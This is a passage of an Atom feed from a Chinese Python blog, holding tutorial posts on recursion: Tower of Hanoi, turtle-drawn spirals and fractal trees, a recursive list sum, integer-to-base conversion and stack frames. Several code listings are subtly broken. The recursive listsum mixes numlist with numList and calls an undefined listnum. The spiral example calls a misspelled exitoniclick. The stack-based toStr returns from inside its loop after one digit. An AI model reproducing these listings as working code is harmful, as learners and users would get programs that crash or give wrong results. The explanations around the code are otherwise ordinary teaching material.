1</em></p><p>我们如何递归地解决这个问题？我们的基本情况是什么？让我们从下到上考虑这个问题。假设你有一个五个盘子的塔，在杆一上。如果你已经知道如何将四个盘子移动到杆二上，那么你可以轻松地将最底部的盘子移动到杆三，然后再将四个盘子从杆二移动到杆三。但是如果你不知道如何移动四个盘子怎么办？假设你知道如何移动三个盘子到杆三;那么很容易将第四个盘子移动到杆二，并将它们从杆三移动到它们的顶部。但是如果你不知道如何移动三个盘子呢？如何将两个盘子移动到杆二，然后将第三个盘子移动到杆三，然后移动两个盘子到它的顶部？但是如果你还不知道该怎么办呢？当然你会知道移动一个盘子到杆三足够容易。这听起来像是基本情况。</p><p>这里是如何使用中间杆将塔从起始杆移动到目标杆的步骤：</p><ol><li>使用目标杆将 <code>height-1</code> 的塔移动到中间杆。</li><li>将剩余的盘子移动到目标杆。</li><li>使用起始杆将 <code>height-1</code> 的塔从中间杆移动到目标杆。</li></ol><p>只要我们遵守规则，较大的盘子保留在栈的底部，我们可以使用递归的三个步骤，处理任何更大的盘子。上面概要中唯一缺失的是识别基本情况。最简单的汉诺塔是一个盘子的塔。在这种情况下，我们只需要将一个盘子移动到其最终目的地。 一个盘子的塔将是我们的基本情况。 此外，上述步骤通过在步骤1和3中减小塔的高度，使我们趋向基本情况。Listing 1 展示了解决汉诺塔的 Python 代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">moveTower</span><span class="params">(height,fromPole, toPole, withPole)</span>:</span></div><div class="line">    <span class="keyword">if</span> height &gt;= <span class="number">1</span>:</div><div class="line">        moveTower(height<span class="number">-1</span>,fromPole,withPole,toPole)</div><div class="line">        moveDisk(fromPole,toPole)</div><div class="line">        moveTower(height<span class="number">-1</span>,withPole,toPole,fromPole)</div></pre></td></tr></table></figure><p><em>Listing 1</em></p><p>请注意，Listing 1 中的代码与描述几乎相同。算法的简单性的关键在于我们进行两个不同的递归调用，一个在第 3 行上，另一个在第 5 行。在第 3 行上，我们将初始杆上的底部圆盘移动到中间。下一行简单地将底部盘移动到其最终的位置。然后在第 5 行上，我们将塔从中间杆移动到最大盘子的顶部。当塔高度为 0 时检测到基本情况; 在这种情况下不需要做什么，所以 <code>moveTower</code> 函数简单地返回。关于以这种方式处理基本情况的重点是，从 <code>moveTower</code> 简单地返回以使 <code>moveDisk</code> 函数被调用。</p><p>函数 <code>moveDisk</code>，如 Listing 2 所示，非常简单。它所做的就是打印出一个盘子从一杆移动到另一杆。 如果你输入并运行 <code>moveTower</code> 程序，你可以看到它给你一个非常有效的解决方案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">moveDisk</span><span class="params">(fp,tp)</span>:</span></div><div class="line">    print(<span class="string">"moving disk from"</span>,fp,<span class="string">"to"</span>,tp)</div></pre></td></tr></table></figure><p><em>Listing 2</em></p><p>现在你已经看到了 <code>moveTower</code> 和 <code>moveDisk</code> 的代码，你可能会想知道为什么我们没有明确记录什么盘子在什么杆上的数据结构。这里有一个提示：如果你要明确地跟踪盘子，你会使用三个 Stack 对象，每个杆一个。 答案是 Python 提供了我们需要调用的隐含的栈。</p><p>### </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;谢尔宾斯基三角形&quot;&gt;&lt;a href=&quot;#谢尔宾斯基三角形&quot; class=&quot;headerlink&quot; title=&quot;谢尔宾斯基三角形&quot;&gt;&lt;/a&gt;谢尔宾斯基三角形&lt;/h1&gt;&lt;p&gt;另外一个展现自相似性的分形是谢尔宾斯基三角形。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>可视化递归</title>
    <link href="http://adamzeng.site/2017/11/03/%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92/"/>
    <id>http://adamzeng.site/2017/11/03/可视化递归/</id>
    <published>2017-11-03T08:38:05.000Z</published>
    <updated>2017-11-03T09:06:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍：可视化递归"><a href="#介绍：可视化递归" class="headerlink" title="介绍：可视化递归"></a>介绍：可视化递归</h1><p>在上一节中，我们讨论了一些使用递归很容易解决的问题; 然而，我们可能很难找到一个模型或一种可视化方法知道在递归函数中发生了什么。这使得递归难以让人掌握。在本节中，我们将看到几个使用递归绘制一些有趣图片的例子。当你看到这些图片的形状，你会对递归过程有新的认识，可能有助于巩固你对递归理解。<a id="more"></a></p><p>我们使用的插图的工具是 Python 的 <code>turtle</code> 模块称为 <code>turtle</code>。<code>turtle</code> 是 Python 所有版本的标准库，并且非常易于使用。比喻很简单。你可以创建一只乌龟，乌龟能前进，后退，左转，右转等。乌龟可以让它的尾巴或上或下。当乌龟的尾巴向下，它移动时会画一条线。为了增加乌龟的艺术价值，你可以改变尾巴的宽度以及尾巴浸入的墨水的颜色。</p><p>这里有一个简单的例子来说明龟图形基础。我们将使用 <code>turtle</code> 模块递归绘制螺旋。 见 ActiveCode 1。导入 <code>turtle</code> 模块后，我们创建一个乌龟。当乌龟被创建时，它也创建一个窗口来绘制。接下来我们定义 <code>drawSpiral</code> 函数。这个简单函数的基本情况是当我们想要绘制的线的长度（由 len 参数给出）减小到零或更小时。如果线的长度大于零，我们让乌龟以 len 单位前进，然后向右转 90 度。当我们再次调用 <code>drawSpiral</code> 并缩短长度时递归。在ActiveCode 1 结束时，你会注意到我们调用函数 <code>myWin.exitonclick()</code>，这是一个方便的缩小窗口的方法，使乌龟进入等待模式，直到你单击窗口，然后程序清理并退出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> turtle</div><div class="line">myTurtle=turtle.Turtle()</div><div class="line">myWin=turtle.Screen()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">drawSpiral</span><span class="params">(myTurtle,lineLen)</span>:</span></div><div class="line">    <span class="keyword">if</span> lineLen&gt;<span class="number">0</span>:</div><div class="line">        myTurtle.forward(lineLen)</div><div class="line">        myTurtle.right(<span class="number">90</span>)</div><div class="line">        drawSpiral(myTurtle,lineLen<span class="number">-5</span>)</div><div class="line"></div><div class="line">drawSpiral(myTurtle,<span class="number">100</span>)</div><div class="line">myWin.exitoniclick()</div></pre></td></tr></table></figure><p>这是关于你知道的所有龟图形，以制作一些令人印象深刻的涂鸦。我们的下一个程序，将绘制一个分形树。分形来自数学的一个分支，并且与递归有很多共同之处。分形的定义是，当你看着它时，无论你放大多少，分形有相同的基本形状。大自然的一些例子是大陆的海岸线，雪花，山脉，甚至树木或灌木。这些自然现象中的许多的分形性质使得程序员能够为计算机生成的电影生成非常逼真的风景。在我们的下一个例子中，将生成一个分形树。</p><p>要理解这如何工作，需要想一想如何使用分形词汇来描述树。记住，我们上面说过，分形是在所有不同的放大倍率下看起来是一样的。如果我们将它翻译成树木和灌木，我们可能会说，即使一个小树枝也有一个整体树的相同的形状和特征。有了这个想法，我们可以说一棵树是树干，一棵较小的树向右走，另一棵较小的树向左走。如果你用递归的思想考虑这个定义，这意味着我们将树的递归定义应用到较小的左树和右树。</p><p>让我们把这个想法转换成一些 Python 代码。Listing 1 展示了如何使用我们的乌龟来生成分形树。让我们更仔细地看一下代码。你会看到在第 5 行和第 7 行，我们正在进行递归调用。在第 5 行，我们在乌龟向右转 20 度之后立即进行递归调用;这是上面提到的右树。然后在第 7 行，乌龟进行另一个递归调用，但这一次后左转 40 度。乌龟必须向左转 40 度的原因是，它需要撤消原来的向右转 20 度，然后再向左转 20 度，以绘制左树。还要注意，每次我们对树进行递归调用时，我们从 <code>branchLen</code> 参数中减去一些量; 这是为了确保递归树越来越小。你还应该看到到第 2 行的初始 if 语句是检查 <code>branchLen</code> 的基本情况大小。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tree</span><span class="params">(branchLen,t)</span>:</span></div><div class="line">    <span class="keyword">if</span> branchLen &gt; <span class="number">5</span>:</div><div class="line">        t.forward(branchLen)</div><div class="line">        t.right(<span class="number">20</span>)</div><div class="line">        tree(branchLen<span class="number">-15</span>,t)</div><div class="line">        t.left(<span class="number">40</span>)</div><div class="line">        tree(branchLen<span class="number">-10</span>,t)</div><div class="line">        t.right(<span class="number">20</span>)</div><div class="line">        t.backward(branchLen)</div></pre></td></tr></table></figure><p><em>Listing 1</em></p><p>此树示例的完整程序在 ActiveCode 2 中。在运行代码之前，请思考你希望看到的树形状。看着递归调用，并想想这棵树将如何展开。它会对称地绘制树的右半边和左半边吗？ 它会先绘制右侧然后左侧？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> turtle</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tree</span><span class="params">(branchLen,t)</span>:</span></div><div class="line">    <span class="keyword">if</span> branchLen &gt; <span class="number">5</span>:</div><div class="line">        t.forward(branchLen)</div><div class="line">        t.right(<span class="number">20</span>)</div><div class="line">        tree(branchLen<span class="number">-15</span>,t)</div><div class="line">        t.left(<span class="number">40</span>)</div><div class="line">        tree(branchLen<span class="number">-15</span>,t)</div><div class="line">        t.right(<span class="number">20</span>)</div><div class="line">        t.backward(branchLen)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    t = turtle.Turtle()</div><div class="line">    myWin = turtle.Screen()</div><div class="line">    t.left(<span class="number">90</span>)</div><div class="line">    t.up()</div><div class="line">    t.backward(<span class="number">100</span>)</div><div class="line">    t.down()</div><div class="line">    t.color(<span class="string">"green"</span>)</div><div class="line">    tree(<span class="number">75</span>,t)</div><div class="line">    myWin.exitonclick()</div><div class="line"></div><div class="line">main()</div></pre></td></tr></table></figure><p><em>Activecode 2</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.7.%E4%BB%8B%E7%BB%8D%EF%BC%9A%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92/assets/4.7.%E4%BB%8B%E7%BB%8D%EF%BC%9A%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92.ac1.png" alt="image"></p><p>注意树上的每个分支点如何对应于递归调用，并注意树的右半部分如何一直绘制到它的最短的树枝。你可以在 Figure 1 中看到这一点。现在，注意程序如何工作，它的方式是直到树的整个右侧绘制完成回到树干。你可以在 Figure 2 中看到树的右半部分。然后绘制树的左侧，但不是尽可能远地向左移动。相反，直到我们进入到左树最小的枝干，左树的右半部分才开始绘制。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.7.%E4%BB%8B%E7%BB%8D%EF%BC%9A%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92/assets/4.7.%E4%BB%8B%E7%BB%8D%EF%BC%9A%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92.figure1.png" alt="image"></p><p><em>Figure 1</em></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.7.%E4%BB%8B%E7%BB%8D%EF%BC%9A%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92/assets/4.7.%E4%BB%8B%E7%BB%8D%EF%BC%9A%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%92%E5%BD%92.figure2.png" alt="image"></p><p><em>Figure 2</em></p><p>这个简单的树程序只是一个起点，你会注意到树看起来不是特别现实，因为自然不像计算机程序那样对称。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;介绍：可视化递归&quot;&gt;&lt;a href=&quot;#介绍：可视化递归&quot; class=&quot;headerlink&quot; title=&quot;介绍：可视化递归&quot;&gt;&lt;/a&gt;介绍：可视化递归&lt;/h1&gt;&lt;p&gt;在上一节中，我们讨论了一些使用递归很容易解决的问题; 然而，我们可能很难找到一个模型或一种可视化方法知道在递归函数中发生了什么。这使得递归难以让人掌握。在本节中，我们将看到几个使用递归绘制一些有趣图片的例子。当你看到这些图片的形状，你会对递归过程有新的认识，可能有助于巩固你对递归理解。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>计算整数列表和</title>
    <link href="http://adamzeng.site/2017/11/02/%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/"/>
    <id>http://adamzeng.site/2017/11/02/计算整数列表和/</id>
    <published>2017-11-02T15:42:08.000Z</published>
    <updated>2017-11-03T08:37:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="计算整数列表和"><a href="#计算整数列表和" class="headerlink" title="计算整数列表和"></a>计算整数列表和</h1><p>我们将以一个简单的问题开始，你已经知道如何不使用递归解决。 假设你想计算整数列表的总和，例如：<code>[1,3,5,7,9]</code>。 计算总和的迭代函数见ActiveCode 1。函数使用累加器变量（<code>theSum</code>）来计算列表中所有整数的和，从 0 开始，加上列表中的每个数字。<a id="more"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listsum</span><span class="params">(numList)</span>:</span></div><div class="line">    theSum = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> numList:</div><div class="line">        theSum = theSum + i</div><div class="line">    <span class="keyword">return</span> theSum</div><div class="line"></div><div class="line">print(listsum([<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]))</div></pre></td></tr></table></figure><p><em>Activecode 1</em></p><p>假设没有while循环或for循环。你将如何计算整数列表的总和？如果你是一个数学家，你可能开始回忆加法是一个函数，这个函数定义了两个整数类型的参数。故将列表和问题从加一个列表重新定义为加一对整数，我们可以把列表重写为一个完全括号表达式。如下所示：<br><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/assets/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C.1.png" alt="image"></p><p>我们也可以把表达式用另一种方式括起来</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/assets/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C.2.png" alt="image"></p><p>注意，最内层的括号（7+9）我们可以没有任何循环或特殊结构来解决它。事实上，我们可以使用以下的简化序列来计算最终的和。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/assets/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C.3.png" alt="image"></p><p>我们如何能把这个想法变成一个 Python 程序？ 首先，让我们以 Python 列表的形式重述求和问题。 我们可以说列表 <code>numList</code> 的和是列表的第一个元素<code>numList[0]</code> 和列表其余部分<code>numList [1:]</code> 之和的总和。 以函数形式表述： </p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/assets/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C.4.png" alt="image"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listsum</span><span class="params">(numlist)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(numList)==<span class="number">1</span>:</div><div class="line">      <span class="keyword">return</span> numList[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      <span class="keyword">return</span> numlist[<span class="number">0</span>]+listnum(numlist[<span class="number">1</span>:])</div><div class="line">print(listnum([<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]))</div></pre></td></tr></table></figure><p><em>Active code 2</em></p><p>在这个清单中有几个关键地方。 首先，在第 2 行，我们检查列表是否为一个元素。这个检查是至关重要的，是我们的函数的转折子句。 长度为 1 的列表和是微不足道的; 它只是列表中的数字。 第二，在第 5 行函数调用自己！ 这就是我们称 listsum 算法递归的原因。<strong>递归函数是调用自身的函数</strong>。</p><p>Figure 1 展示了对列表<code>[1,3,5,7,9]</code> 求和所需的一系列递归调用。 你应该把这一系列的调用想象成一系列的简化。 每次我们进行递归调用时，我们都会解决一个较小的问题，直到达到问题不能减小的程度。 </p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/assets/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C.figure1.png" alt="image"></p><p><em>Figure 1</em></p><p>当我们到达简单问题的点，我们开始拼凑每个小问题的答案，直到初始问题解决。Figure 2 展示了在 <code>listsum</code> 通过一系列调用返回的过程中执行的 add 操作。当 <code>listsum</code> 从最顶层返回时，我们就有了整个问题的答案。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C/assets/4.3.%E8%AE%A1%E7%AE%97%E6%95%B4%E6%95%B0%E5%88%97%E8%A1%A8%E5%92%8C.figure2.png" alt="image"></p><p><em>Figure 2</em></p><h3 id="递归的三定律"><a href="#递归的三定律" class="headerlink" title="递归的三定律"></a>递归的三定律</h3><p>像阿西莫夫机器人，所有递归算法必须服从三个重要的定律：</p><ol><li>递归算法必须具有基本情况。</li><li>递归算法必须改变其状态并向基本情况靠近。</li><li>递归算法必须以递归方式调用自身。</li></ol><p>让我们更详细地看看每一个定律，看看它如何在 <code>listsum</code> 算法中使用。首先，基本情况是算法停止递归的条件。基本情况通常是足够小以直接求解的问题。在<code>listsum</code> 算法中，基本情况是长度为 1 的列表。</p><p>为了遵守第二定律，我们必须将算法向基本情况的状态改变。状态的改变意味着该算法正在使用的一些数据被修改。通常，表示问题的数据在某种程度上变小。在<code>listsum</code> 算法中，我们的主要数据结构是一个列表，因此我们必须将我们的状态转换工作集中在列表上。因为基本情况是长度 1 的列表，所以朝向基本情况的自然进展是缩短列表。在 Activecode 2 第五行，我们调用 <code>listsum</code> 生成一个较短的列表。</p><p>最后的法则是算法必须调用自身。这是递归的定义。递归对于许多新手程序员来说是一个混乱的概念。作为一个新手程序员，你已经知道函数是有益的，因为你可以将一个大问题分解成较小的问题。较小的问题可以通过编写一个函数来解决。我们用一个函数来解决问题，但该函数通过调用自己解决问题！该逻辑不是循环；递归的逻辑是通过将问题分解成更小个更容易的问题来解决的优雅表达。</p><p>在本章中的剩余部分，我们将讨论更多递归的例子。在每种情况下，我们将集中于使用递归的三个定律来设计问题的解决方案。</p><h3 id="整数转换为任意进制字符串"><a href="#整数转换为任意进制字符串" class="headerlink" title="整数转换为任意进制字符串"></a>整数转换为任意进制字符串</h3><p>假设你想将一个整数转换为一个二进制和十六进制字符串。例如，将整数<code>10</code> 转换为十进制字符串表示为 <code>10</code>，或将其字符串表示为二进制 <code>1010</code>。虽然有很多算法来解决这个问题，包括在栈部分讨论的算法，但递归的解决方法非常优雅。</p><p>让我们看一个十进制 <code>769</code> 的具体示例。假设我们有一个对应于前 <code>10</code> 位数的字符序列，例如 <code>convString =“0123456789”</code>。通过在序列中查找，很容易将小于 <code>10</code> 的数字转换为其等效的字符串。例如，如果数字为 <code>9</code> ，则字符串为 convString[9] 或 “9”。如果我们将数字 <code>769</code> 分成三个单个位数字，<code>7</code>，<code>6</code> 和 <code>9</code>，那么将其转换为字符串很简单。数字小于 10 听起来像一个好的基本情况。</p><p>知道我们的基本情况是什么意味着整个算法将分成三个部分：</p><ol><li>将原始数字减少为一系列单个位数字。</li><li>使用查找将单个位数字数字转换为字符串。</li><li>将单个位字符串连接在一起以形成最终结果。</li></ol><p>下一步是找到改变其状态的方法并向基本情况靠近。由于我们示例为整数，所以考虑什么数学运算可以减少一个数字。最可能的候选是除法和减法。虽然减法可能可以实现，但我们不清楚应该减去多少。使用余数的整数除法为我们提供了一个明确的方向。让我们看看如果我们将一个数字除以我们试图转换的基数，会发生什么。</p><p>使用整数除法将 <code>769</code> 除以 <code>10</code> ，我们得到 <code>76</code>，余数为 <code>9</code>。这给了我们两个好的结果。首先，余数是小于我们的基数的数字，可以通过查找立即转换为字符串。第二，我们得到的商小于原始数字，并让我们靠近具有小于基数的单个数字的基本情况。现在我们的工作是将 <code>76</code> 转换为其字符串表示。再次，我们使用商和余数分别获得 <code>7</code> 和 <code>6</code> 的结果。最后，我们将问题减少到转换 <code>7</code>，我们可以很容易地做到，因为它满足 <code>n &lt; base</code> 的基本条件，其中 <code>base = 10</code>。我们刚刚执行的一系列操作如 Figure 3 所示。请注意，余数位于图右侧框中。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.5.%E6%95%B4%E6%95%B0%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BB%BB%E6%84%8F%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2/assets/4.5.%E6%95%B4%E6%95%B0%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BB%BB%E6%84%8F%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2.figure3.png" alt="image"></p><p><em>Figure 3</em></p><p>ActiveCode 1 展示了实现上述算法的 Python 代码， 以 2 到 16 之间的任何基数为参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">toStr</span><span class="params">(n,base)</span>:</span></div><div class="line">   convertString = <span class="string">"0123456789ABCDEF"</span></div><div class="line">   <span class="keyword">if</span> n &lt; base:</div><div class="line">      <span class="keyword">return</span> convertString[n]</div><div class="line">   <span class="keyword">else</span>:</div><div class="line">      <span class="keyword">return</span> toStr(n//base,base) + convertString[n%base]</div><div class="line"></div><div class="line">print(toStr(<span class="number">1453</span>,<span class="number">16</span>))</div></pre></td></tr></table></figure><p>请注意，在第3行中，我们检查基本情况，其中n小于我们要转换的基数。让我们检测到基本情况时，我们停止递归，并简单地从convertString序列返回字符串。在第6行中，我们满足第三和第二定律-递归调用和减少除法问题大小。</p><p>让我们再次跟踪算法；这次我们将数字10将转换为其基数为2的字符串（“1010”）。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.5.%E6%95%B4%E6%95%B0%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BB%BB%E6%84%8F%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2/assets/4.5.%E6%95%B4%E6%95%B0%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BB%BB%E6%84%8F%E8%BF%9B%E5%88%B6%E5%AD%97%E7%AC%A6%E4%B8%B2.figure4.png" alt="image"></p><p><em>Figure 4</em></p><p>Figure 4 显示我们得到的结果，但看起来数字是错误的顺序。该算法是正确的，因为我们首先在第 6 行进行递归调用，然后我们添加余数的字符串形式。 如果我们反向返回 convertString 查找并返回 toStr 调用，则生成的字符串将是反向的！通过延后连接操作直到递归调用返回，我们可以得到正确顺序的结果。这应该能使你想起你在上一章中讨论的栈。</p><h3 id="栈帧：实现递归"><a href="#栈帧：实现递归" class="headerlink" title="栈帧：实现递归"></a>栈帧：实现递归</h3><p>假设不是将递归调用的结果与来自 convertString 的字符串拼接到 toStr，我们修改了算法，以便在进行递归调用之前将字符串入栈。此修改的算法的代码展示在 ActiveCode 1 中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.stack <span class="keyword">import</span> Stack</div><div class="line">rStack=Stack()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">toStr</span><span class="params">(n,base)</span>:</span></div><div class="line">    convertString=<span class="string">"0123456789ABCDEF"</span></div><div class="line">    <span class="keyword">while</span> n&gt;<span class="number">0</span>:</div><div class="line">        <span class="keyword">if</span> n&lt;base:</div><div class="line">            rStack.push(convertString[n])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            rStack.push(convertString[n%base])</div><div class="line">        n=n//base</div><div class="line">        res=<span class="string">""</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">not</span> rStack.isEmpty():</div><div class="line">            res=res+str(rStack.pop())</div><div class="line">        <span class="keyword">return</span> res</div><div class="line">print(toStr(<span class="number">1453</span>,<span class="number">16</span>))</div></pre></td></tr></table></figure><p>其实不需要对n是否小于base进行判断，因为当n小于base时返回的字符串与n大于base时返回的字符串没区别。</p><p><em>ActiveCode 1</em></p><p>每次我们调用 toStr，我们在栈上推入一个字符。回到前面的例子，我们可以看到在第四次调用 toStr 之后，栈看起来像 Figure 5 。注意，现在我们可以简单地将字符从栈中弹出，并将它们连接成最终结果 “1010”。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.6.%E6%A0%88%E5%B8%A7%EF%BC%9A%E5%AE%9E%E7%8E%B0%E9%80%92%E5%BD%92/assets/4.6.%E6%A0%88%E5%B8%A7%EF%BC%9A%E5%AE%9E%E7%8E%B0%E9%80%92%E5%BD%92.figure5.png" alt="image"></p><p><em>Figure 5</em></p><p>前面的例子让我们了解了 Python 如何实现一个递归函数调用。 当在 Python 中调用函数时，会分配一个栈来处理函数的局部变量。当函数返回时，返回值留在栈的顶部，以供调用函数访问。 Figure 6 说明了第 4 行返回语句后的调用栈。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/4.%E9%80%92%E5%BD%92/4.6.%E6%A0%88%E5%B8%A7%EF%BC%9A%E5%AE%9E%E7%8E%B0%E9%80%92%E5%BD%92/assets/4.6.%E6%A0%88%E5%B8%A7%EF%BC%9A%E5%AE%9E%E7%8E%B0%E9%80%92%E5%BD%92.figure6.png" alt="image"></p><p><em>Figure 6</em></p><p>注意，对 <code>toStr(2//2,2)</code> 的调用在栈上返回值为 “1”。 然后，在表达式 <code>“1” + convertString[2％2]</code>中使用此返回值替换函数调用<code>(toStr(1,2))</code>，这将在栈顶部留下字符串 “10”。 这样，Python 调用栈就代替了我们在 Listing 4 中明确使用的栈。在我们的列表求和示例中，你可以认为栈上的返回值取代了累加器变量。</p><p>栈帧还为函数使用的变量提供了一个作用域。 即使我们重复地调用相同的函数，每次调用都会为函数本地的变量创建一个新的作用域。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;计算整数列表和&quot;&gt;&lt;a href=&quot;#计算整数列表和&quot; class=&quot;headerlink&quot; title=&quot;计算整数列表和&quot;&gt;&lt;/a&gt;计算整数列表和&lt;/h1&gt;&lt;p&gt;我们将以一个简单的问题开始，你已经知道如何不使用递归解决。 假设你想计算整数列表的总和，例如：&lt;code&gt;[1,3,5,7,9]&lt;/code&gt;。 计算总和的迭代函数见ActiveCode 1。函数使用累加器变量（&lt;code&gt;theSum&lt;/code&gt;）来计算列表中所有整数的和，从 0 开始，加上列表中的每个数字。
    
    </summary>
    
